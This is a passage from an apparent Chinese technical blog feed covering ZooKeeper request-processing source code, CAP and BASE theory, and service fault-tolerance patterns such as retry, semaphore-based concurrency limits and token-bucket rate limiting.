SetDataRequest();</span><br><span class="line">               pRequest2Txn(request.type, zks.getNextZxid(), request, setDataRequest, <span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> OpCode.setACL:</span><br><span class="line">               SetACLRequest setAclRequest = <span class="keyword">new</span> SetACLRequest();</span><br><span class="line">               pRequest2Txn(request.type, zks.getNextZxid(), request, setAclRequest, <span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> OpCode.check:</span><br><span class="line">               CheckVersionRequest checkRequest = <span class="keyword">new</span> CheckVersionRequest();</span><br><span class="line">               pRequest2Txn(request.type, zks.getNextZxid(), request, checkRequest, <span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> OpCode.multi:</span><br><span class="line">               MultiTransactionRecord multiRequest = <span class="keyword">new</span> MultiTransactionRecord();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   ByteBufferInputStream.byteBuffer2Record(request.request, multiRequest);</span><br><span class="line">               &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                   request.hdr =  <span class="keyword">new</span> TxnHeader(request.sessionId, request.cxid, zks.getNextZxid(),</span><br><span class="line">                           Time.currentWallTime(), OpCode.multi);</span><br><span class="line">                   <span class="keyword">throw</span> e;</span><br><span class="line">               &#125;</span><br><span class="line">               List&lt;Txn&gt; txns = <span class="keyword">new</span> ArrayList&lt;Txn&gt;();</span><br><span class="line">               <span class="comment">//Each op in a multi-op must have the same zxid!</span></span><br><span class="line">               <span class="keyword">long</span> zxid = zks.getNextZxid();</span><br><span class="line">               KeeperException ke = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">               <span class="comment">//Store off current pending change records in case we need to rollback</span></span><br><span class="line">               HashMap&lt;String, ChangeRecord&gt; pendingChanges = getPendingChanges(multiRequest);</span><br><span class="line"></span><br><span class="line">               <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">for</span>(Op op: multiRequest) &#123;</span><br><span class="line">                   Record subrequest = op.toRequestRecord() ;</span><br><span class="line"></span><br><span class="line">                   <span class="comment">/* If we've already failed one of the ops, don't bother</span></span><br><span class="line"><span class="comment">                    * trying the rest as we know it's going to fail and it</span></span><br><span class="line"><span class="comment">                    * would be confusing in the logfiles.</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="keyword">if</span> (ke != <span class="keyword">null</span>) &#123;</span><br><span class="line">                       request.hdr.setType(OpCode.error);</span><br><span class="line">                       request.txn = <span class="keyword">new</span> ErrorTxn(Code.RUNTIMEINCONSISTENCY.intValue());</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   <span class="comment">/* Prep the request and convert to a Txn */</span></span><br><span class="line">                   <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="keyword">try</span> &#123;</span><br><span class="line">                           pRequest2Txn(op.getType(), zxid, request, subrequest, <span class="keyword">false</span>);</span><br><span class="line">                       &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">                           ke = e;</span><br><span class="line">                           request.hdr.setType(OpCode.error);</span><br><span class="line">                           request.txn = <span class="keyword">new</span> ErrorTxn(e.code().intValue());</span><br><span class="line">                           LOG.info(<span class="string">"Got user-level KeeperException when processing "</span></span><br><span class="line">                           		+ request.toString() + <span class="string">" aborting remaining multi ops."</span></span><br><span class="line">                           		+ <span class="string">" Error Path:"</span> + e.getPath()</span><br><span class="line">                           		+ <span class="string">" Error:"</span> + e.getMessage());</span><br><span class="line"></span><br><span class="line">                           request.setException(e);</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/* Rollback change records from failed multi-op */</span></span><br><span class="line">                           rollbackPendingChanges(zxid, pendingChanges);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   <span class="comment">//<span class="doctag">FIXME:</span> I don't want to have to serialize it here and then</span></span><br><span class="line">                   <span class="comment">//       immediately deserialize in next processor. But I'm</span></span><br><span class="line">                   <span class="comment">//       not sure how else to get the txn stored into our list.</span></span><br><span class="line">                   ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                   BinaryOutputArchive boa = BinaryOutputArchive.getArchive(baos);</span><br><span class="line">                   request.txn.serialize(boa, <span class="string">"request"</span>) ;</span><br><span class="line">                   ByteBuffer bb = ByteBuffer.wrap(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">                   txns.add(<span class="keyword">new</span> Txn(request.hdr.getType(), bb.array()));</span><br><span class="line">                   index++;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               request.hdr = <span class="keyword">new</span> TxnHeader(request.sessionId, request.cxid, zxid,</span><br><span class="line">                       Time.currentWallTime(), request.type);</span><br><span class="line">               request.txn = <span class="keyword">new</span> MultiTxn(txns);</span><br><span class="line"></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">//create/close session don't require request record</span></span><br><span class="line">           <span class="keyword">case</span> OpCode.createSession:</span><br><span class="line">           <span class="keyword">case</span> OpCode.closeSession:</span><br><span class="line">               pRequest2Txn(request.type, zks.getNextZxid(), request, <span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">//All the rest don't need to create a Txn - just verify session</span></span><br><span class="line">           <span class="keyword">case</span> OpCode.sync:</span><br><span class="line">           <span class="keyword">case</span> OpCode.exists:</span><br><span class="line">           <span class="keyword">case</span> OpCode.getData:</span><br><span class="line">           <span class="keyword">case</span> OpCode.getACL:</span><br><span class="line">           <span class="keyword">case</span> OpCode.getChildren:</span><br><span class="line">           <span class="keyword">case</span> OpCode.getChildren2:</span><br><span class="line">           <span class="keyword">case</span> OpCode.ping:</span><br><span class="line">           <span class="keyword">case</span> OpCode.setWatches:</span><br><span class="line">               zks.sessionTracker.checkSession(request.sessionId,</span><br><span class="line">                       request.getOwner());</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               LOG.warn(<span class="string">"unknown type "</span> + request.type);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">           <span class="keyword">if</span> (request.hdr != <span class="keyword">null</span>) &#123;</span><br><span class="line">               request.hdr.setType(OpCode.error);</span><br><span class="line">               request.txn = <span class="keyword">new</span> ErrorTxn(e.code().intValue());</span><br><span class="line">           &#125;</span><br><span class="line">           LOG.info(<span class="string">"Got user-level KeeperException when processing "</span></span><br><span class="line">                   + request.toString()</span><br><span class="line">                   + <span class="string">" Error Path:"</span> + e.getPath()</span><br><span class="line">                   + <span class="string">" Error:"</span> + e.getMessage());</span><br><span class="line">           request.setException(e);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="comment">// log at error level as we are returning a marshalling</span></span><br><span class="line">           <span class="comment">// error to the user</span></span><br><span class="line">           LOG.error(<span class="string">"Failed to process "</span> + request, e);</span><br><span class="line"></span><br><span class="line">           StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">           ByteBuffer bb = request.request;</span><br><span class="line">           <span class="keyword">if</span>(bb != <span class="keyword">null</span>)&#123;</span><br><span class="line">               bb.rewind();</span><br><span class="line">               <span class="keyword">while</span> (bb.hasRemaining()) &#123;</span><br><span class="line">                   sb.append(Integer.toHexString(bb.get() &amp; <span class="number">0xff</span>));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               sb.append(<span class="string">"request buffer is null"</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           LOG.error(<span class="string">"Dumping request buffer: 0x"</span> + sb.toString());</span><br><span class="line">           <span class="keyword">if</span> (request.hdr != <span class="keyword">null</span>) &#123;</span><br><span class="line">               request.hdr.setType(OpCode.error);</span><br><span class="line">               request.txn = <span class="keyword">new</span> ErrorTxn(Code.MARSHALLINGERROR.intValue());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       request.zxid = zks.getZxid();</span><br><span class="line">       nextProcessor.processRequest(request);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>主要是根据 Request 的 type 来判断处理不同的请求,具体的请求不深入说明了.</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>至此,zookeeper 单机启动的方式已经做了大概的描述，当然内部还有很多其他的细节没有涉及到。</p>
<blockquote>
<ul>
<li>JDK NIO 的方式比较复杂,需要频繁设置读取位置。Netty 的实现方式比较简洁,这里也没有做具体的说明.</li>
<li>请求接收和响应是核心以及 jute 的序列化.</li>
<li>线程安全的保证、读写锁、volatile 保证变量对线程的可见性.</li>
</ul>
</blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://www.jianshu.com/p/3fa7e7726fbb" target="_blank" rel="noopener">Slf4j MDC 详解</a></li>
<li><a href="https://zookeeper.apache.org/" target="_blank" rel="noopener">zookeeper 官网</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式系统CAP和BASE理论</title>
    <url>/2017/12/21/distributed/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9FCAP%E5%92%8CBASE%E7%90%86%E8%AE%BA/</url>
    <content><![CDATA[<p>随着互联网的发展,计算机系统也从集中式向分布式演变。<br><a id="more"></a></p>
<h1 id="集中式和分布式系统比较"><a href="#集中式和分布式系统比较" class="headerlink" title="集中式和分布式系统比较"></a>集中式和分布式系统比较</h1><p>集中式系统是指一台或多台计算机组成计算中心,系统所有的功能都由这个中心提供。集中式系统部署简单,但是有明显的单点问题,随着业务和数据量的增长,扩容也比较困难。</p>
<p>分布式系统是硬件或软件组成分布在不同的计算机网络上,彼此之间仅仅通过消息传递进行通信和协调的服务。在没有特殊约束的情况下,分布式系统有以下特征:</p>
<blockquote>
<ul>
<li>分布性</li>
</ul>
</blockquote>
<p>分布式系统中的各个系统在空间上都是随意的,可以分布在不同机柜、机房、城市、国家等。同时,系统的分布特性随时变化。</p>
<blockquote>
<ul>
<li>对等性</li>
</ul>
</blockquote>
<p>分布式系统中计算机是对等的,没有主从之分。既没有控制整个系统的主机,也没有被控制的从机。</p>
<blockquote>
<ul>
<li>并发性</li>
</ul>
</blockquote>
<p>在计算机网络中,程序运行过程中的并发操作很常见。比如分布式系统中的不同节点,公共操作一份公共资源。如何处理好分布式系统的并发操作也是分布式系统架构设计的一大挑战。</p>
<blockquote>
<ul>
<li>缺乏全局时钟</li>
</ul>
</blockquote>
<p>分布式系统中很难来区分事件执行的先后顺序，缺乏全局的时钟。</p>
<blockquote>
<ul>
<li>故障总会发生</li>
</ul>
</blockquote>
<p>分布式系统的各个节点都有可能发生故障。</p>
<h1 id="分布式系统面临的各种问题"><a href="#分布式系统面临的各种问题" class="headerlink" title="分布式系统面临的各种问题"></a>分布式系统面临的各种问题</h1><blockquote>
<ul>
<li>通信异常</li>
</ul>
</blockquote>
<p>由于硬件、软件等因素导致网络通信异常,从而导致分布式系统不可用。</p>
<blockquote>
<ul>
<li>网络分区</li>
</ul>
</blockquote>
<p>由于网络异常，导致节点之间的延时不断增大，导致整个分布式系统中部分服务瘫称为网络分区,俗称为“脑裂”。当出现脑裂问题时,小部分正常也服务节点也要维持整个分布式系统的数据一致性,这就成为分布式系统的架构设计的一大挑战。</p>
<blockquote>
<ul>
<li>三态</li>
</ul>
</blockquote>
<p>分布式系统中的节点请求和响应的状态分为三种：成功、失败和超时。</p>
<blockquote>
<ul>
<li>节点故障</li>
</ul>
</blockquote>
<p>分布式系统中的任一节点都有可能发生宕机或僵死现象。</p>
<h1 id="CAP定理"><a href="#CAP定理" class="headerlink" title="CAP定理"></a>CAP定理</h1><p> 一致性(Consistency)、可用性(Availability)和分区容忍性(Partitiontolerance)。CAP原理指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。这是Brewer教授于2000年提出的，后人也论证了CAP理论的正确性。</p>
<blockquote>
<ul>
<li>一致性（Consistency）</li>
</ul>
</blockquote>
<p> 在分布式环境中,一致性是指数据在多个副本之间是否能够保持一致的特性。在一致性的需求下，当一个系统在数据一致的状态下执行更新操作后，应该保证系统的数据仍然处于一致状态。<br> 对于分布式的存储系统，一个数据往往会存在多份。简单的说，一致性会让客户对数据的修改操作（增/删/改）,要么在所有的数据副本（replica）全部成功，要么全部失败。即，修改操作对于一份数据的所有副本（整个系统）而言，是原子（atomic）的操作。如果一个存储系统可以保证一致性，那么则客户读写的数据完全可以保证是最新的。不会发生两个不同的客户端在不同的存储节点中读取到不同副本的情况。</p>
<blockquote>
<ul>
<li>可用性（Availability）</li>
</ul>
</blockquote>
<p> 是指用户的一次操作必须在有限的时间内得到返回结果。如果超过有限时间,虽然返回了结果也认为不可用。</p>
<blockquote>
<ul>
<li>分区容忍性（Partition Tolerance）</li>
</ul>
</blockquote>
<p>如果你的存储系统只运行在一个节点上，要么系统整个崩溃，要么全部运行良好。一旦针对同一服务的存储系统分布到了多个节点后，整个存储系统就存在分区的可能性。比如，两个存储节点之间联通的网络断开（无论长时间或者短暂的），就形成了分区。一般来讲，为了提高服务质量，同一份数据放置在不同城市非常正常的。因此节点之间形成分区也很正常。<br>Gilbert 和Lynch将分区容忍性定义如下：除全部网络节点全部故障以外，所有子节点集合的故障都不允许导致整个系统不正确响应。即使部分的组件不可用，施加的操作也可以完成。</p>
<p>一个数据存储系统不可能同时满足上述三个特性，只能同时满足其两个特性，也就是： CA,CP,AP。可以这么说，当前所有的数据存储解决方案，都可以归类的上述三种类型。</p>
<pre><code> CA  满足数据的一致性和高可用性，但没有可扩展性，如传统的关系型数据，基本上满足是这个解决方案，如ORACLE , MYSQL 的单节点，满足数据的一致性和高可用性。

 CP  满足数据的一致性和分区性，如Oracle RAC ，Sybase 集群。虽然Oracle RAC具备一点的扩展性，但当节点达到一定数目时，性能（也即可用性）就会下降很快，并且节点之间的网络开销还在，需要实时同步各节点之间的数据。

 AP 在性能和可扩展性方面表现不错，但在数据一致性方面会用牺牲，各节点的之间数据同步没有哪么快，但能保存数据的最终一致性。当前热炒的NOSQL大多类是典型的AP类型数据库。
</code></pre><h1 id="BASE理论"><a href="#BASE理论" class="headerlink" title="BASE理论"></a>BASE理论</h1><p>BASE是Basically Available（基本可用）、Soft state（软状态）和Eventually consistent（最终一致性）三个短语的简写，BASE是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的结论，是基于CAP定理逐步演化而来的，其核心思想是即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。接下来我们着重对BASE中的三要素进行详细讲解。</p>
<blockquote>
<ul>
<li>基本可用</li>
</ul>
</blockquote>
<p>基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性——但请注意，这绝不等价于系统不可用，以下两个就是“基本可用”的典型例子。</p>
<p>响应时间上的损失：正常情况下，一个在线搜索引擎需要0.5秒内返回给用户相应的查询结果，但由于出现异常（比如系统部分机房发生断电或断网故障），查询结果的响应时间增加到了1~2秒。<br>功能上的损失：正常情况下，在一个电子商务网站上进行购物，消费者几乎能够顺利地完成每一笔订单，但是在一些节日大促购物高峰的时候，由于消费者的购物行为激增，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面。<br>弱状态也称为软状态，和硬状态相对，是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据听不的过程存在延时。</p>
<blockquote>
<ul>
<li>最终一致性</li>
</ul>
</blockquote>
<p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性</p>
<p>亚马逊首席技术官Werner Vogels在于2008年发表的一篇文章中对最终一致性进行了非常详细的介绍。他认为最终一致性时一种特殊的弱一致性：系统能够保证在没有其他新的更新操作的情况下，数据最终一定能够达到一致的状态，因此所有客户端对系统的数据访问都能够胡渠道最新的值。同时，在没有发生故障的前提下，数据达到一致状态的时间延迟，取决于网络延迟，系统负载和数据复制方案设计等因素。</p>
<p>在实际工程实践中，最终一致性存在以下五类主要变种。</p>
<blockquote>
<ul>
<li>因果一致性：</li>
</ul>
</blockquote>
<p>因果一致性是指，如果进程A在更新完某个数据项后通知了进程B，那么进程B之后对该数据项的访问都应该能够获取到进程A更新后的最新值，并且如果进程B要对该数据项进行更新操作的话，务必基于进程A更新后的最新值，即不能发生丢失更新情况。与此同时，与进程A无因果关系的进程C的数据访问则没有这样的限制。</p>
<blockquote>
<ul>
<li>读己之所写：</li>
</ul>
</blockquote>
<p> 读己之所写是指，进程A更新一个数据项之后，它自己总是能够访问到更新过的最新值，而不会看到旧值。也就是说，对于单个数据获取者而言，其读取到的数据一定不会比自己上次写入的值旧。因此，读己之所写也可以看作是一种特殊的因果一致性。</p>
<blockquote>
<ul>
<li>会话一致性：</li>
</ul>
</blockquote>
<p>会话一致性将对系统数据的访问过程框定在了一个会话当中：系统能保证在同一个有效的会话中实现“读己之所写”的一致性，也就是说，执行更新操作之后，客户端能够在同一个会话中始终读取到该数据项的最新值。</p>
<blockquote>
<ul>
<li>单调读一致性：</li>
</ul>
</blockquote>
<p>单调读一致性是指如果一个进程从系统中读取出一个数据项的某个值后，那么系统对于该进程后续的任何数据访问都不应该返回更旧的值。</p>
<blockquote>
<ul>
<li>单调写一致性：</li>
</ul>
</blockquote>
<p>单调写一致性是指，一个系统需要能够保证来自同一个进程的写操作被顺序地执行。</p>
<p>以上就是最终一致性的五类常见的变种，在时间系统实践中，可以将其中的若干个变种互相结合起来，以构建一个具有最终一致性的分布式系统。事实上，可以将其中的若干个变种相互结合起来，以构建一个具有最终一致性特性的分布式系统。事实上，最终一致性并不是只有那些大型分布式系统才设计的特性，许多现代的关系型数据库都采用了最终一致性模型。在现代关系型数据库中，大多都会采用同步和异步方式来实现主备数据复制技术。在同步方式中，数据的复制国耻鞥通常是更新事务的一部分，因此在事务完成后，主备数据库的数据就会达到一致。而在异步方式中，备库的更新往往存在延时，这取决于事务日志在主备数据库之间传输的时间长短，如果传输时间过长或者甚至在日志传输过程中出现异常导致无法及时将事务应用到备库上，那么狠显然，从备库中读取的的数据将是旧的，因此就出现了不一致的情况。当然，无论是采用多次重试还是认为数据订正，关系型数据库还是能搞保证最终数据达到一致——这就是系统提供最终一致性保证的经典案例。</p>
<p>总的来说，BASE理论面向的是大型高可用可扩展的分布式系统，和传统事务的ACID特性使相反的，它完全不同于ACID的强一致性模型，而是提出通过牺牲强一致性来获得可用性，并允许数据在一段时间内是不一致的，但最终达到一致状态。但同时，在实际的分布式场景中，不同业务单元和组件对数据一致性的要求是不同的，因此在具体的分布式系统架构设计过程中，ACID特性与BASE理论往往又会结合在一起使用。</p>
<p>小结：<br>计算机系统从集中式向分布式的变革随着包括分布式网络、分布式事务和分布式数据一致性等在内的一系列问题与挑战，同时也催生了一大批诸如ACID、CAP和BASE等经典理论的快速发展。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>《从PAXOS到ZOOKEEPER分布式一致性原理与实践》</li>
<li><a href="http://wiki.mbalib.com/zh-tw/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">分散式系统—智库百科</a></li>
<li><a href="https://en.wikipedia.org/wiki/Distributed_computing" target="_blank" rel="noopener">Distributed computing
</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>服务容错</title>
    <url>/2018/04/24/distributed/%E6%9C%8D%E5%8A%A1%E5%AE%B9%E9%94%99/</url>
    <content><![CDATA[<blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>随着美团点评服务框架和服务治理体系的逐步成熟，服务化已成为公司内部系统设计的趋势。本着大系统小做、职责单一的原则，我们度假技术团队对业务系统进行了不少服务化拆分工作。随着业务复杂度的增加，依赖的服务也逐步增加，出现了不少由于服务调用出现异常问题而导致的重大事故，如：</p>
</blockquote>
<p>1）系统依赖的某个服务发生延迟或者故障，数秒内导致所有应用资源（线程，队列等）被耗尽，造成所谓的雪崩效应 (Cascading Failure)，导致整个系统拒绝对外提供服务。</p>
<p>2）系统遭受恶意爬虫袭击，在放大效应下没有对下游依赖服务做好限速处理，最终导致下游服务崩溃。</p>
<p>容错是一个很大的话题，受篇幅所限，本文将介绍仅限定在服务调用间常用的一些容错模式。</p>
<blockquote>
<h1 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h1><p>服务容错的设计有个基本原则，就是“Design for Failure”。为了避免出现“千里之堤溃于蚁穴”这种情况，在设计上需要考虑到各种边界场景和对于服务间调用出现的异常或延迟情况，同时在设计和编程时也要考虑周到。这一切都是为了达到以下目标：</p>
<ul>
<li><p>一个依赖服务的故障不会严重破坏用户的体验。</p>
</li>
<li><p>系统能自动或半自动处理故障，具备自我恢复能力。</p>
</li>
</ul>
</blockquote>
<p>基于这个原则和目标，衍生出下文将要介绍的一些模式，能够解决分布式服务调用中的一些问题，提高系统在故障发生时的存活能力。</p>
<blockquote>
<h1 id="一些经典的容错模式"><a href="#一些经典的容错模式" class="headerlink" title="一些经典的容错模式"></a>一些经典的容错模式</h1><p>所谓模式，其实就是某种场景下一类问题及其解决方案的总结归纳，往往可以重用。模式可以指导我们完成任务，作出合理的系统设计方案，达到事半功倍的效果。而在服务容错这个方向，行业内已经有了不少实践总结出来的解决方案。</p>
<h2 id="超时与重试（Timeout-and-Retry）"><a href="#超时与重试（Timeout-and-Retry）" class="headerlink" title="超时与重试（Timeout and Retry）"></a>超时与重试（Timeout and Retry）</h2><p>超时模式，是一种最常见的容错模式，在美团点评的工程实践中大量存在。常见的有设置网络连接超时时间，一次RPC的响应超时时间等。在分布式服务调用的场景中，它主要解决了当依赖服务出现建立网络连接或响应延迟，不用无限等待的问题，调用方可以根据事先设计的超时时间中断调用，及时释放关键资源，如Web容器的连接数，数据库连接数等，避免整个系统资源耗尽出现拒绝对外提供服务这种情况。</p>
</blockquote>
<p>重试模式，一般和超时模式结合使用，适用于对于下游服务的数据强依赖的场景（不强依赖的场景不建议使用！），通过重试来保证数据的可靠性或一致性，常用于因网络抖动等导致服务调用出现超时的场景。与超时时间设置结合使用后，需要考虑接口的响应时间分布情况，超时时间可以设置为依赖服务接口99.5%响应时间的值，重试次数一般1-2次为宜，否则会导致请求响应时间延长，拖累到整个系统。</p>
<p>一些实现说明：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RetryCommand</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> maxRetries = <span class="number">2</span>;<span class="comment">// 重试次数 默认2次</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> retryInterval = <span class="number">5</span>;<span class="comment">//重试间隔时间ms 默认5ms</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; params;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="title">RetryCommand</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RetryCommand</span><span class="params">(<span class="keyword">long</span> retryInterval, <span class="keyword">int</span> maxRetries)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">this</span>.retryInterval = retryInterval;</span><br><span class="line">        <span class="keyword">this</span>.maxRetries = maxRetries;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">command</span><span class="params">(Map&lt;String, Object&gt; params)</span></span>&#123;</span><br><span class="line">          <span class="comment">//Some remote service call with timeout</span></span><br><span class="line">           serviceA.doSomethingWithTimeOut(timeout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> T <span class="title">retry</span><span class="params">()</span> <span class="keyword">throws</span> RuntimeException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> retryCounter = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (retryCounter &lt; maxRetries) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> command(params);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                retryCounter++;</span><br><span class="line">                <span class="keyword">if</span> (retryCounter &gt;= maxRetries) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Command failed on all of "</span> + maxRetries + <span class="string">" retries"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<h1 id="限流-Rate-Limiting-Load-Shedder"><a href="#限流-Rate-Limiting-Load-Shedder" class="headerlink" title="限流(Rate Limiting/Load Shedder)"></a>限流(Rate Limiting/Load Shedder)</h1></blockquote>
<p>限流模式，常用于下游服务容量有限，但又怕出现突发流量猛增（如恶意爬虫，节假日大促等）而导致下游服务因压力过大而拒绝服务的场景。常见的限流模式有控制并发和控制速率，一个是限制并发的数量，一个是限制并发访问的速率。</p>
<blockquote>
<ul>
<li>控制并发</li>
</ul>
</blockquote>
<p>属于一种较常见的限流手段，在工程实践中可以通过信号量机制（如Java中的Semaphore）来控制，举个例子：</p>
<p>假如有一个需求，要读取几万个文件的数据，因为都是IO密集型任务，我们可以启动几十个线程并发的读取，但是如果读到内存后，还需要存储到数据库中，而数据库的连接数只有10个，这时我们必须控制只有十个线程同时获取数据库连接保存数据，否则会报错无法获取数据库连接。这个时候，我们就可以使用Semaphore来控制并发数，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SemaphoreTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> THREAD_COUNT = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ExecutorService threadPool = Executors</span><br><span class="line">        .newFixedThreadPool(THREAD_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Semaphore s = <span class="keyword">new</span> Semaphore(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; THREAD_COUNT; i++) &#123;</span><br><span class="line">            threadPool.execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        s.acquire();</span><br><span class="line">                        System.out.println(<span class="string">"save data"</span>);</span><br><span class="line">                        s.release();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStack();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        threadPool.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码中，虽然有30个线程在执行，但是只允许10个并发的执行。Semaphore的构造方法Semaphore(int permits) 接受一个整型的数字，表示可用的许可证数量。Semaphore(10)表示允许10个线程获取许可证，也就是最大并发数是10。Semaphore的用法也很简单，首先线程使用Semaphore的acquire()获取一个许可证，使用完之后调用release()归还许可证，还可以用tryAcquire()方法尝试获取许可证。</p>
<blockquote>
<ul>
<li>控制速率</li>
</ul>
</blockquote>
<p>在我们的工程实践中，常见的是使用令牌桶算法来实现这种模式，其他如漏桶算法也可以实现控制速率，但在我们的工程实践中使用不多，这里不做介绍，读者请自行了解。</p>
<p><img src="https://i.imgur.com/3gG9MC0.jpg" alt></p>
<p>在Wikipedia上，令牌桶算法是这么描述的：</p>
<p>每秒会有r个令牌放入桶中，或者说，每过1/r秒桶中增加一个令牌。</p>
<p>桶中最多存放b个令牌，如果桶满了，新放入的令牌会被丢弃。</p>
<p>当一个n字节的数据包到达时，消耗n个令牌，然后发送该数据包。</p>
<p>如果桶中可用令牌小于n，则该数据包将被缓存或丢弃。</p>
